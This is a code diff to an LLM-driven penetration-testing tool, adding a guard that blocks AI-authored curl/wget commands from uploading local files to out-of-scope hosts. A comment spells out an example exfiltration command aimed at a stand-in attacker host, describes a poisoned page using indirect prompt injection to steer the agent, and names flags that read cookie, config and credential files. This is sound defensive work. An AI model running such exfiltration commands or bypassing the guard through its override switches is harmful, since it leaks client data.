@@ -63,7 +63,7 @@ import sys
 import time
 from datetime import datetime
 from pathlib import Path
-from urllib.parse import urlsplit
+from urllib.parse import urlparse, urlsplit
 
 try:
     import ollama as _ollama_lib
@@ -207,6 +207,181 @@ _DESTRUCTIVE_PATTERNS = (
 # scoped "DELETE FROM t WHERE id=1" PoC is not blocked.
 _UNBOUNDED_DELETE_RE = re.compile(r"\bdelete\s+from\s+\S+(?!.*\bwhere\b)", re.I)
 
+# ── egress / exfil guard ─────────────────────────────────────────────────────────
+# Allowlisted HTTP/transfer tools that can read a LOCAL FILE and POST it to a remote host.
+# The shell-redirection ban ('> <') already stops `nc host port < loot`, but it does NOT
+# stop curl/wget reading the file via their OWN flags (the tool opens the file, no shell
+# redirect). A poisoned page / indirect prompt injection could thus steer the executor into
+# `curl -d @dump.sql https://attacker.invalid` — allowlisted binary, non-self host, no
+# destructive pattern — to exfiltrate client data. This gate blocks a LOCAL-FILE upload to
+# an OUT-OF-SCOPE host while leaving in-scope uploads (legit webshell drop to the target)
+# and inline-data OOB pings (no @file) alone.
+_EXFIL_TOOLS = frozenset({"curl", "wget"})
+# Flags whose argument is a local FILE that curl/wget then READS and sends on the wire.
+# (-b/--cookie reads a cookie file; -K/--config & --netrc-file read option/credential files —
+# all confirmed exfil vectors in adversarial review.) The -d @f / -F x=@f / --post-file forms
+# are detected separately via the @ / =@ / --post-file markers.
+_FILE_READ_FLAGS = frozenset({
+    "-T", "--upload-file", "-b", "--cookie", "-K", "--config", "--netrc-file",
+})
+# Flags that CONSUME their following token as a value, so that token is NOT a destination host
+# (prevents e.g. a cookie-file path or POST body from being mistaken for the target). --url is
+# deliberately ABSENT: its value IS the destination and must be scope-checked.
+_VALUE_CONSUMING_FLAGS = frozenset({
+    "-T", "--upload-file", "-o", "--output", "-K", "--config", "-b", "--cookie",
+    "-c", "--cookie-jar", "--netrc-file", "-d", "--data", "--data-binary", "--data-ascii",
+    "--data-raw", "--data-urlencode", "-F", "--form", "-H", "--header", "-u", "--user",
+    "-A", "--user-agent", "-e", "--referer", "-x", "--proxy", "-E", "--cert", "--key",
+    "-X", "--request", "-m", "--max-time", "-w", "--write-out", "--connect-to", "--resolve",
+    "--retry", "-y", "--speed-time", "-Y", "--speed-limit", "-r", "--range",
+})
+_PIPE_OPS = {";", "|", "||", "&", "&&", "(", ")", "<", ">", "<<", ">>"}
+
+
+def _host_in_scope(host: str, scope_hosts) -> bool:
+    if not host or not scope_hosts:
+        return False
+    h = host.lower().strip("[]")
+    for s in scope_hosts:
+        s = str(s).lower().strip()
+        if s and (h == s or h.endswith("." + s)):
+            return True
+    return False
+
+
+def _is_loopback_host(host: str) -> bool:
+    if not host:
+        return False
+    h = host.lower().strip("[]")
+    return h in ("localhost", "127.0.0.1", "0.0.0.0", "::1") or h.startswith("127.")
+
+
+def _dest_host(tok: str) -> str:
+    """Best-effort destination host from a curl/wget argument — handles scheme URLs
+    (case-insensitive, userinfo-aware) AND schemeless targets (curl defaults to http, so
+    `attacker.invalid` is a real destination). Returns '' for tokens that do not look like
+    a host (so a bare filename without a dot is not mistaken for one)."""
+    if not tok:
+        return ""
+    if "://" in tok.lower():
+        try:
+            return (urlparse(tok).hostname or "").lower()
+        except Exception:
+            return ""
+    hostpart = tok.split("/")[0]
+    if "@" in hostpart:                       # strip user:pass@
+        hostpart = hostpart.split("@")[-1]
+    if hostpart.startswith("["):              # [IPv6]:port
+        hostpart = hostpart[1:].split("]")[0]
+    else:
+        hostpart = hostpart.split(":")[0]
+    hostpart = hostpart.strip().lower()
+    # Require a dot (domain or IPv4) to avoid treating a random bare arg as a host.
+    return hostpart if ("." in hostpart and not hostpart.startswith(".")) else ""
+
+
+def _stage_egress_violation(stage, scope_hosts) -> str:
+    if not stage:
+        return ""
+    i = 0
+    while i < len(stage) and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", stage[i]):
+        i += 1  # skip leading VAR=VALUE assignments
+    while i < len(stage) and os.path.basename(stage[i]) in ("env", "timeout"):
+        i += 1
+        if i < len(stage) and os.path.basename(stage[i - 1]) == "timeout":
+            while i < len(stage) and stage[i].startswith("-"):
+                i += 1
+            if i < len(stage) and re.match(r"^\d+(\.\d+)?[smhd]?$", stage[i]):
+                i += 1
+        else:
+            while i < len(stage) and re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", stage[i]):
+                i += 1
+    if i >= len(stage) or os.path.basename(stage[i]) not in _EXFIL_TOOLS:
+        return ""
+    args = stage[i + 1:]
+
+    reads_file = False
+    for tok in args:
+        if tok.startswith("@") or "=@" in tok or "=<" in tok or tok in _FILE_READ_FLAGS \
+           or tok.startswith(("--post-file", "--body-file", "--config=", "--cookie=",
+                              "--netrc-file=")):
+            reads_file = True
+            break
+    if not reads_file:
+        return ""
+
+    # Resolve destination host(s): walk argv, skip flags and the value each consumes; every
+    # remaining bare token is a candidate target (scheme or schemeless).
+    hosts, j = [], 0
+    while j < len(args):
+        t = args[j]
+        if t.startswith("-"):
+            if "=" not in t and t in _VALUE_CONSUMING_FLAGS and j + 1 < len(args):
+                j += 2
+                continue
+            j += 1
+            continue
+        if t.startswith("@"):
+            j += 1
+            continue
+        h = _dest_host(t)
+        if h:
+            hosts.append(h)
+        j += 1
+
+    if not hosts:
+        # File-reading transfer with no resolvable destination (e.g. URL hidden inside a -K
+        # config file) — fail closed; the legit exploit loop always names the target on argv.
+        return ("egress exfil blocked: file-reading curl/wget with no resolvable in-scope "
+                "destination (option/config-file exfil vector). Set BRAIN_ALLOW_ANY_CMD=1 "
+                "to override.")
+    for h in hosts:
+        if _is_loopback_host(h):
+            continue
+        if not _host_in_scope(h, scope_hosts):
+            return ("egress exfil blocked: an allowlisted HTTP tool would read a LOCAL FILE "
+                    f"and send it to out-of-scope host '{h}'. Add it to BRAIN_SCOPE_HOSTS if "
+                    "this destination is authorized, or set BRAIN_ALLOW_ANY_CMD=1 to override.")
+    return ""
+
+
+def _egress_exfil_violation(raw: str, scope_hosts, strict: bool) -> str:
+    """Return a rejection string if the command reads a LOCAL FILE and sends it (via an
+    allowlisted HTTP tool) to a host NOT in engagement scope; '' if clean.
+
+    Per-stage (split on shell operators) so a piped file-reader in one stage cannot poison the
+    destination of a curl/wget in another. Enforced only when scope is known OR ``strict`` —
+    otherwise a no-op so existing two-arg callers keep their behavior. Inline data with no
+    @file/file-flag (an OOB-collaborator ping) is deliberately NOT treated as exfil. Lifted by
+    the caller only via the nuclear BRAIN_ALLOW_ANY_CMD; ``allow_destructive`` does NOT lift it
+    (exfil to an out-of-scope host is never a legitimate destructive test).
+    """
+    if not strict and not scope_hosts:
+        return ""
+    try:
+        lex = shlex.shlex(raw, posix=True, punctuation_chars="();<>|&")
+        lex.whitespace_split = True
+        tokens = list(lex)
+    except ValueError:
+        return ""  # unparseable — the binary-allowlist parser will reject it downstream
+    if not ({os.path.basename(t) for t in tokens} & _EXFIL_TOOLS):
+        return ""
+
+    stages, cur = [], []
+    for tok in tokens:
+        if tok in _PIPE_OPS:
+            stages.append(cur)
+            cur = []
+        else:
+            cur.append(tok)
+    stages.append(cur)
+
+    for stage in stages:
+        reason = _stage_egress_violation(stage, scope_hosts)
+        if reason:
+            return reason
+    return ""
+
 
 def _truncate_note(text: str, limit: int) -> str:
     """Truncate ``text`` to ``limit`` chars, appending an explicit overflow marker so
@@ -219,7 +394,7 @@ def _truncate_note(text: str, limit: int) -> str:
     return text[:limit] + f"\n... [truncated {dropped} chars from this AI summary input]"
 
 
-def guard_command(cmd: str, allow_destructive: bool = False) -> tuple[bool, str]:
+def guard_command(cmd: str, allow_destructive: bool = False, scope_hosts=None) -> tuple[bool, str]:
     """Decide whether an LLM-authored command may be executed.
 
     Returns (allowed, reason). ``reason`` is '' when allowed, otherwise a short
@@ -229,6 +404,13 @@ def guard_command(cmd: str, allow_destructive: bool = False) -> tuple[bool, str]
     used by the explicit --sqli-rce/--allow-exploit opt-in so the os-shell/file-write
     escalation it exists to run is not dead-pathed by the denylist. It NEVER lifts the
     binary allowlist (that still requires BRAIN_ALLOW_ANY_CMD=1).
+
+    ``scope_hosts`` (optional iterable of in-scope hostnames/IPs) drives the egress/exfil
+    gate: a LOCAL-FILE upload by an allowlisted HTTP tool to a host outside this set is
+    blocked (indirect-prompt-injection exfil defence). Falls back to the comma-separated
+    BRAIN_SCOPE_HOSTS env var; when neither is set the gate is a no-op unless
+    BRAIN_STRICT_EGRESS=1. This gate is lifted ONLY by BRAIN_ALLOW_ANY_CMD — NOT by
+    ``allow_destructive`` (exfil to an out-of-scope host is never a legitimate test).
     """
     raw = (cmd or "").strip()
     if not raw:
@@ -237,6 +419,13 @@ def guard_command(cmd: str, allow_destructive: bool = False) -> tuple[bool, str]
     allow_any = os.environ.get("BRAIN_ALLOW_ANY_CMD") == "1"
     allow_destructive = (allow_destructive or allow_any
                          or os.environ.get("BRAIN_ALLOW_DESTRUCTIVE") == "1")
+
+    if scope_hosts is None:
+        env_scope = os.environ.get("BRAIN_SCOPE_HOSTS", "")
+        scope_hosts = {h.strip().lower() for h in env_scope.split(",") if h.strip()} or None
+    else:
+        scope_hosts = {str(h).strip().lower() for h in scope_hosts if str(h).strip()} or None
+    strict_egress = os.environ.get("BRAIN_STRICT_EGRESS") == "1"
 
     low = raw.lower()
 
@@ -249,6 +438,13 @@ def guard_command(cmd: str, allow_destructive: bool = False) -> tuple[bool, str]
         if _UNBOUNDED_DELETE_RE.search(raw):
             return False, ("unbounded SQL DELETE (no WHERE) blocked "
                            "(set BRAIN_ALLOW_DESTRUCTIVE=1 to override)")
+
+    # (a.2) EGRESS / exfil gate — independent of allow_destructive; lifted only by the
+    # nuclear BRAIN_ALLOW_ANY_CMD. Stops local-file upload to an out-of-scope host.
+    if not allow_any:
+        egress_reason = _egress_exfil_violation(raw, scope_hosts, strict_egress)
+        if egress_reason:
+            return False, egress_reason
 
     if allow_any:
         return True, ""
@@ -1041,6 +1237,9 @@ class Brain:
         # --file-write (webshell) at the LIVE target. Opt in via --sqli-rce (hunt.py) or
         # --allow-exploit (brain.py CLI). Set BEFORE any early-return so it is always defined.
         self.allow_exploit = False
+        # In-scope host(s) for the egress/exfil gate (set per-engagement via set_scope()).
+        # None => guard_command falls back to BRAIN_SCOPE_HOSTS / BRAIN_STRICT_EGRESS.
+        self.scope_hosts = None
         self._llm = LLMClient(provider or os.environ.get("BRAIN_PROVIDER"))
 
         if not self._llm.available:
@@ -2757,7 +2956,11 @@ NEXT ACTION: <one concrete action>
         # --allow-exploit), lift the destructive denylist so the os-shell/file-write
         # escalation the exploit loop is DESIGNED to run is not silently dead-pathed.
         # The binary allowlist is unaffected and still applies.
-        _allowed, _reason = guard_command(cmd, allow_destructive=bool(getattr(self, "allow_exploit", False)))
+        _allowed, _reason = guard_command(
+            cmd,
+            allow_destructive=bool(getattr(self, "allow_exploit", False)),
+            scope_hosts=getattr(self, "scope_hosts", None),
+        )
         if not _allowed:
             return -1, "", f"COMMAND BLOCKED (guard): {_reason}"
         env = {**os.environ, "PATH": f"{os.path.expanduser('~/go/bin')}:{os.environ.get('PATH', '')}"}
@@ -2895,6 +3098,24 @@ NEXT ACTION: <one concrete action>
             return m.group(1).strip()
         return None
 
+    def set_scope(self, *hosts) -> None:
+        """Register the engagement's in-scope host(s) for the egress/exfil gate.
+
+        Accepts hostnames or full URLs (the hostname is extracted). Once set, an LLM-authored
+        local-file upload to any OUT-OF-SCOPE host is blocked by guard_command(). Idempotent
+        and additive across calls."""
+        acc = set(getattr(self, "scope_hosts", None) or set())
+        for h in hosts:
+            if not h:
+                continue
+            s = str(h).strip()
+            if "://" in s:
+                s = urlparse(s).hostname or ""
+            s = s.split("/")[0].split(":")[0].strip().lower()
+            if s:
+                acc.add(s)
+        self.scope_hosts = acc or None
+
     def exploit_finding(self, target_url: str, vuln_type: str,
                         evidence: str, findings_dir: str = "",
                         extra_context: str = "") -> str:
@@ -2913,6 +3134,11 @@ NEXT ACTION: <one concrete action>
         """
         if not self.enabled:
             return "", ""
+
+        # The engagement target is, by definition, in scope for the egress gate — a webshell
+        # drop / data POST to the target itself is legitimate. Anything OUTSIDE it is the
+        # exfil we want to stop. (Additive: BRAIN_SCOPE_HOSTS / prior set_scope() persist.)
+        self.set_scope(target_url)
 
         # Enforce the documented "OFF by default" invariant at the FUNCTION boundary,
         # not just at the auto_triage_and_exploit caller. The exploit loop runs
